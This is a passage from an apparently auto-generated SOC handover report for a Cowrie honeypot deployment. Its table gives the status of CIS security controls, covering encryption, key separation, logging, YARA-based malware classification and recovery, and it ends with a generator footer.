| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-21T20:30:16Z_
